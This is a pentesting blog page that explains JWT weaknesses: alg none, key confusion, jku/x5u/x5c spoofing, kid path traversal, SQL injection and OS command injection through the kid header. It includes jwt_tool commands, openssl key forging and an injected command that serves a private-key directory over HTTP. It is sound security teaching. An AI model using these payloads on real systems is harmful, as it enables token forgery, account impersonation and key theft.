<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> JWT Vulnerabilities (Json Web Tokens) | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-hacking-jwt-json-web-tokens/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">JWT Vulnerabilities (Json Web Tokens)</h1> <p class="post-description"></p> </header> <article> <h1 id="jwt-vulnerabilities-json-web-tokens">JWT Vulnerabilities (Json Web Tokens)</h1> <p><strong>Part of this post is based in the awesome post:</strong> <a href="https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology" rel="external nofollow noopener" target="_blank"><strong>https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology</strong></a><br> <strong>Author of the great tool to pentest JWTs</strong> <a href="https://github.com/ticarpi/jwt_tool" rel="external nofollow noopener" target="_blank"><strong>https://github.com/ticarpi/jwt_tool</strong></a></p> <h3 id="quick-wins"><strong>Quick Wins</strong></h3> <p>Run <a href="https://github.com/ticarpi/jwt_tool" rel="external nofollow noopener" target="_blank"><strong>jwt_tool</strong></a> with mode <code class="language-plaintext highlighter-rouge">All Tests!</code> and wait for green lines</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 jwt_tool.py <span class="nt">-M</span> at <span class="se">\</span>
    <span class="nt">-t</span> <span class="s2">"https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245"</span> <span class="se">\</span>
    <span class="nt">-rh</span> <span class="s2">"Authorization: Bearer eyJhbG...&lt;JWT Token&gt;"</span>
</code></pre></div></div> <p>If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:</p> <p><img src="../images/image%20(935).png" alt=""></p> <p>Then, you can search the request in your proxy or dump the used JWT for that request using jwt_ tool:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 jwt_tool.py <span class="nt">-Q</span> <span class="s2">"jwttool_706649b802c9f5e41052062a3787b291"</span>
</code></pre></div></div> <p>You can also use the <a href="https://github.com/d0ge/sign-saboteur" rel="external nofollow noopener" target="_blank"><strong>Burp Extension SignSaboteur</strong></a> to launch JWT attacks from Burp.</p> <h3 id="tamper-data-without-modifying-anything">Tamper data without modifying anything</h3> <p>You can just tamper with the data leaving the signature as is and check if the server is checking the signature. Try to change your username to “admin” for example.</p> <h4 id="is-the-token-checked"><strong>Is the token checked?</strong></h4> <p>To check if a JWT’s signature is being verified:</p> <ul> <li>An error message suggests ongoing verification; sensitive details in verbose errors should be reviewed.</li> <li>A change in the returned page also indicates verification.</li> <li>No change suggests no verification; this is when to experiment with tampering payload claims.</li> </ul> <h3 id="origin">Origin</h3> <p>It’s important to determine whether the token was generated server-side or client-side by examining the proxy’s request history.</p> <ul> <li>Tokens first seen from the client side suggest the key might be exposed to client-side code, necessitating further investigation.</li> <li>Tokens originating server-side indicate a secure process.</li> </ul> <h3 id="duration">Duration</h3> <p>Check if the token lasts more than 24h… maybe it never expires. If there is a “exp” filed, check if the server is correctly handling it.</p> <h3 id="brute-force-hmac-secret">Brute-force HMAC secret</h3> <p><a href="../generic-hacking/brute-force.md#jwt"><strong>See this page.</strong></a></p> <h3 id="modify-the-algorithm-to-none">Modify the algorithm to None</h3> <p>Set the algorithm used as “None” and remove the signature part.</p> <p>Use the Burp extension call “JSON Web Token” to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the “JSON Web Token” tab you can modify the values of the token. You can also select to put the value of the “Alg” field to “None”).</p> <h3 id="change-the-algorithm-rs256asymmetric-to-hs256symmetric-cve-2016-5431cve-2016-10555">Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)</h3> <p>The algorithm HS256 uses the secret key to sign and verify each message.<br> The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.</p> <p>If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.</p> <p>Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_client <span class="nt">-connect</span> example.com:443 2&gt;&amp;1 &lt; /dev/null | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'/-----BEGIN/,/-----END/p'</span> <span class="o">&gt;</span> certificatechain.pem <span class="c">#For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.</span>
openssl x509 <span class="nt">-pubkey</span> <span class="nt">-in</span> certificatechain.pem <span class="nt">-noout</span> <span class="o">&gt;</span> pubkey.pem
</code></pre></div></div> <h3 id="new-public-key-inside-the-header">New public key inside the header</h3> <p>An attacker embeds a new key in the header of the token and the server uses this new key to verify the signature (CVE-2018-0114).</p> <p>This can be done with the “JSON Web Tokens” Burp extension.<br> (Send the request to the Repeater, inside the JSON Web Token tab select “CVE-2018-0114” and send the request).</p> <h3 id="jwks-spoofing">JWKS Spoofing</h3> <p>The instructions detail a method to assess the security of JWT tokens, particularly those employing a “jku” header claim. This claim should link to a JWKS (JSON Web Key Set) file that contains the public key necessary for the token’s verification.</p> <ul> <li> <strong>Assessing Tokens with “jku” Header</strong>: <ul> <li>Verify the “jku” claim’s URL to ensure it leads to the appropriate JWKS file.</li> <li>Modify the token’s “jku” value to direct towards a controlled web service, allowing traffic observation.</li> </ul> </li> <li> <strong>Monitoring for HTTP Interaction</strong>: <ul> <li>Observing HTTP requests to your specified URL indicates the server’s attempts to fetch keys from your provided link.</li> <li>When employing <code class="language-plaintext highlighter-rouge">jwt_tool</code> for this process, it’s crucial to update the <code class="language-plaintext highlighter-rouge">jwtconf.ini</code> file with your personal JWKS location to facilitate the testing.</li> </ul> </li> <li> <p><strong>Command for <code class="language-plaintext highlighter-rouge">jwt_tool</code></strong>:</p> <ul> <li> <p>Execute the following command to simulate the scenario with <code class="language-plaintext highlighter-rouge">jwt_tool</code>:</p> <div class="language-bash highlighter-rouge"> <div class="highlight"><pre class="highlight"><code>python3 jwt_tool.py JWT_HERE <span class="nt">-X</span> s
</code></pre></div> </div> </li> </ul> </li> </ul> <h3 id="kid-issues-overview">Kid Issues Overview</h3> <p>An optional header claim known as <code class="language-plaintext highlighter-rouge">kid</code> is utilized for identifying a specific key, which becomes particularly vital in environments where multiple keys exist for token signature verification. This claim assists in selecting the appropriate key to verify a token’s signature.</p> <h4 id="revealing-key-through-kid">Revealing Key through “kid”</h4> <p>When the <code class="language-plaintext highlighter-rouge">kid</code> claim is present in the header, it’s advised to search the web directory for the corresponding file or its variations. For instance, if <code class="language-plaintext highlighter-rouge">"kid":"key/12345"</code> is specified, the files <em>/key/12345</em> and <em>/key/12345.pem</em> should be searched for in the web root.</p> <h4 id="path-traversal-with-kid">Path Traversal with “kid”</h4> <p>The <code class="language-plaintext highlighter-rouge">kid</code> claim might also be exploited to navigate through the file system, potentially allowing the selection of an arbitrary file. It’s feasible to test for connectivity or execute Server-Side Request Forgery (SSRF) attacks by altering the <code class="language-plaintext highlighter-rouge">kid</code> value to target specific files or services. Tampering with the JWT to change the <code class="language-plaintext highlighter-rouge">kid</code> value while retaining the original signature can be achieved using the <code class="language-plaintext highlighter-rouge">-T</code> flag in jwt_tool, as demonstrated below:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 jwt_tool.py &lt;JWT&gt; <span class="nt">-I</span> <span class="nt">-hc</span> kid <span class="nt">-hv</span> <span class="s2">"../../dev/null"</span> <span class="nt">-S</span> hs256 <span class="nt">-p</span> <span class="s2">""</span>
</code></pre></div></div> <p>By targeting files with predictable content, it’s possible to forge a valid JWT. For instance, the <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/randomize_va_space</code> file in Linux systems, known to contain the value <strong>2</strong>, can be used in the <code class="language-plaintext highlighter-rouge">kid</code> parameter with <strong>2</strong> as the symmetric password for JWT generation.</p> <h4 id="sql-injection-via-kid">SQL Injection via “kid”</h4> <p>If the <code class="language-plaintext highlighter-rouge">kid</code> claim’s content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the <code class="language-plaintext highlighter-rouge">kid</code> payload. An example payload that uses SQL injection to alter the JWT signing process includes:</p> <p><code class="language-plaintext highlighter-rouge">non-existent-index' UNION SELECT 'ATTACKER';-- -</code></p> <p>This alteration forces the use of a known secret key, <code class="language-plaintext highlighter-rouge">ATTACKER</code>, for JWT signing.</p> <h4 id="os-injection-through-kid">OS Injection through “kid”</h4> <p>A scenario where the <code class="language-plaintext highlighter-rouge">kid</code> parameter specifies a file path used within a command execution context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the <code class="language-plaintext highlighter-rouge">kid</code> parameter, it’s possible to expose private keys. An example payload for achieving RCE and key exposure is:</p> <p><code class="language-plaintext highlighter-rouge">/root/res/keys/secret7.key; cd /root/res/keys/ &amp;&amp; python -m SimpleHTTPServer 1337&amp;</code></p> <h3 id="x5u-and-jku">x5u and jku</h3> <h4 id="jku">jku</h4> <p>jku stands for <strong>JWK Set URL</strong>.<br> If the token uses a “<strong>jku</strong>” <strong>Header</strong> claim then <strong>check out the provided URL</strong>. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.</p> <p>First you need to create a new certificate with new private &amp; public keys</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> keypair.pem 2048
openssl rsa <span class="nt">-in</span> keypair.pem <span class="nt">-pubout</span> <span class="nt">-out</span> publickey.crt
openssl pkcs8 <span class="nt">-topk8</span> <span class="nt">-inform</span> PEM <span class="nt">-outform</span> PEM <span class="nt">-nocrypt</span> <span class="nt">-in</span> keypair.pem <span class="nt">-out</span> pkcs8.key
</code></pre></div></div> <p>Then you can use for example <a href="https://jwt.io" rel="external nofollow noopener" target="_blank"><strong>jwt.io</strong></a> to create the new JWT with the <strong>created public and private keys and pointing the parameter jku to the certificate created.</strong> In order to create a valid jku certificate you can download the original one anche change the needed parameters.</p> <p>You can obtain the parametes “e” and “n” from a public certificate using:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from Crypto.PublicKey import RSA
fp <span class="o">=</span> open<span class="o">(</span><span class="s2">"publickey.crt"</span>, <span class="s2">"r"</span><span class="o">)</span>
key <span class="o">=</span> RSA.importKey<span class="o">(</span>fp.read<span class="o">())</span>
fp.close<span class="o">()</span>
print<span class="o">(</span><span class="s2">"n:"</span>, hex<span class="o">(</span>key.n<span class="o">))</span>
print<span class="o">(</span><span class="s2">"e:"</span>, hex<span class="o">(</span>key.e<span class="o">))</span>
</code></pre></div></div> <h4 id="x5u">x5u</h4> <p>X.509 URL. A URI pointing to a set of X.509 (a certificate format standard) public certificates encoded in PEM form. The first certificate in the set must be the one used to sign this JWT. The subsequent certificates each sign the previous one, thus completing the certificate chain. X.509 is defined in RFC 52807 . Transport security is required to transfer the certificates.</p> <p>Try to <strong>change this header to an URL under your control</strong> and check if any request is received. In that case you <strong>could tamper the JWT</strong>.</p> <p>To forge a new token using a certificate controlled by you, you need to create the certificate and extract the public and private keys:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-x509</span> <span class="nt">-nodes</span> <span class="nt">-days</span> 365 <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> attacker.key <span class="nt">-out</span> attacker.crt
openssl x509 <span class="nt">-pubkey</span> <span class="nt">-noout</span> <span class="nt">-in</span> attacker.crt <span class="o">&gt;</span> publicKey.pem
</code></pre></div></div> <p>Then you can use for example <a href="https://jwt.io" rel="external nofollow noopener" target="_blank"><strong>jwt.io</strong></a> to create the new JWT with the <strong>created public and private keys and pointing the parameter x5u to the certificate .crt created.</strong></p> <p><img src="../images/image%20(956).png" alt=""></p> <p>You can also abuse both of these vulns <strong>for SSRFs</strong>.</p> <h4 id="x5c">x5c</h4> <p>This parameter may contain the <strong>certificate in base64</strong>:</p> <p><img src="../images/image%20(1119).png" alt=""></p> <p>If the attacker <strong>generates a self-signed certificate</strong> and creates a forged token using the corresponding private key and replace the “x5c” parameter’s value with the newly generatedcertificate and modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-x509</span> <span class="nt">-nodes</span> <span class="nt">-days</span> 365 <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> attacker.key <span class="nt">-outattacker</span>.crt
openssl x509 <span class="nt">-in</span> attacker.crt <span class="nt">-text</span>
</code></pre></div></div> <h3 id="embedded-public-key-cve-2018-0114">Embedded Public Key (CVE-2018-0114)</h3> <p>If the JWT has embedded a public key like in the following scenario:</p> <p><img src="../images/image%20(624).png" alt=""></p> <p>Using the following nodejs script it’s possible to generate a public key from that data:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const NodeRSA <span class="o">=</span> require<span class="o">(</span><span class="s1">'node-rsa'</span><span class="o">)</span><span class="p">;</span>
const fs <span class="o">=</span> require<span class="o">(</span><span class="s1">'fs'</span><span class="o">)</span><span class="p">;</span>
n <span class="o">=</span><span class="s2">"​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"</span>​<span class="p">;</span>
e <span class="o">=</span> <span class="s2">"AQAB"</span><span class="p">;</span>
const key <span class="o">=</span> new NodeRSA<span class="o">()</span><span class="p">;</span>
var importedKey <span class="o">=</span> key.importKey<span class="o">({</span>n: Buffer.from<span class="o">(</span>n, <span class="s1">'base64'</span><span class="o">)</span>,e: Buffer.from<span class="o">(</span>e, <span class="s1">'base64'</span><span class="o">)</span>,<span class="o">}</span>, <span class="s1">'components-public'</span><span class="o">)</span><span class="p">;</span>
console.log<span class="o">(</span>importedKey.exportKey<span class="o">(</span><span class="s2">"public"</span><span class="o">))</span><span class="p">;</span>
</code></pre></div></div> <p>It’s possible to generate a new private/public key, embeded the new public key inside the token and use it to generate a new signature:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> keypair.pem 2048
openssl rsa <span class="nt">-in</span> keypair.pem <span class="nt">-pubout</span> <span class="nt">-out</span> publickey.crt
openssl pkcs8 <span class="nt">-topk8</span> <span class="nt">-inform</span> PEM <span class="nt">-outform</span> PEM <span class="nt">-nocrypt</span> <span class="nt">-in</span> keypair.pem <span class="nt">-out</span> pkcs8.key
</code></pre></div></div> <p>You can obtain the “n” and “e” using this nodejs script:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const NodeRSA <span class="o">=</span> require<span class="o">(</span><span class="s1">'node-rsa'</span><span class="o">)</span><span class="p">;</span>
const fs <span class="o">=</span> require<span class="o">(</span><span class="s1">'fs'</span><span class="o">)</span><span class="p">;</span>
keyPair <span class="o">=</span> fs.readFileSync<span class="o">(</span><span class="s2">"keypair.pem"</span><span class="o">)</span><span class="p">;</span>
const key <span class="o">=</span> new NodeRSA<span class="o">(</span>keyPair<span class="o">)</span><span class="p">;</span>
const publicComponents <span class="o">=</span> key.exportKey<span class="o">(</span><span class="s1">'components-public'</span><span class="o">)</span><span class="p">;</span>
console.log<span class="o">(</span><span class="s1">'Parameter n: '</span>, publicComponents.n.toString<span class="o">(</span><span class="s2">"hex"</span><span class="o">))</span><span class="p">;</span>
console.log<span class="o">(</span><span class="s1">'Parameter e: '</span>, publicComponents.e.toString<span class="o">(</span>16<span class="o">))</span><span class="p">;</span>
</code></pre></div></div> <p>Finally, using the public and private key and the new “n” and “e” values you can use <a href="https://jwt.io" rel="external nofollow noopener" target="_blank">jwt.io</a> to forge a new valid JWT with any information.</p> <h3 id="es256-revealing-the-private-key-with-same-nonce">ES256: Revealing the private key with same nonce</h3> <p>If some applications use ES256 and use the same nonce to generate two jwts, the private key can be restored.</p> <p>Here is a example: <a href="https://asecuritysite.com/encryption/ecd5" rel="external nofollow noopener" target="_blank">ECDSA: Revealing the private key, if same nonce used (with SECP256k1)</a></p> <h3 id="jti-jwt-id">JTI (JWT ID)</h3> <p>The JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can be used to prevent the token from being replayed.<br> However, imagine a situation where the maximun length of the ID is 4 (0001-9999). The request 0001 and 10001 are going to use the same ID. So if the backend is incrementig the ID on each request you could abuse this to <strong>replay a request</strong> (needing to send 10000 request between each successful replay).</p> <h3 id="jwt-registered-claims">JWT Registered claims</h3> <p>https://www.iana.org/assignments/jwt/jwt.xhtml#claims</p> <h3 id="other-attacks">Other attacks</h3> <p><strong>Cross-service Relay Attacks</strong></p> <p>It has been observed that some web applications rely on a trusted JWT service for the generation and management of their tokens. Instances have been recorded where a token, generated for one client by the JWT service, was accepted by another client of the same JWT service. If the issuance or renewal of a JWT via a third-party service is observed, the possibility of signing up for an account on another client of that service using the same username/email should be investigated. An attempt should then be made to replay the obtained token in a request to the target to see if it is accepted.</p> <ul> <li>A critical issue may be indicated by the acceptance of your token, potentially allowing the spoofing of any user’s account. However, it should be noted that permission for wider testing might be required if signing up on a third-party application, as this could enter a legal grey area.</li> </ul> <p><strong>Expiry Check of Tokens</strong></p> <p>The token’s expiry is checked using the “exp” Payload claim. Given that JWTs are often employed without session information, careful handling is required. In many instances, capturing and replaying another user’s JWT could enable impersonation of that user. The JWT RFC recommends mitigating JWT replay attacks by utilizing the “exp” claim to set an expiry time for the token. Furthermore, the implementation of relevant checks by the application to ensure the processing of this value and the rejection of expired tokens is crucial. If the token includes an “exp” claim and testing time limits allow, storing the token and replaying it after the expiry time has passed is advised. The content of the token, including timestamp parsing and expiry checking (timestamp in UTC), can be read using the jwt_tool’s -R flag.</p> <ul> <li>A security risk may be present if the application still validates the token, as it may imply that the token could never expire.</li> </ul> <h3 id="tools">Tools</h3> <p>https://github.com/ticarpi/jwt_tool</p> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>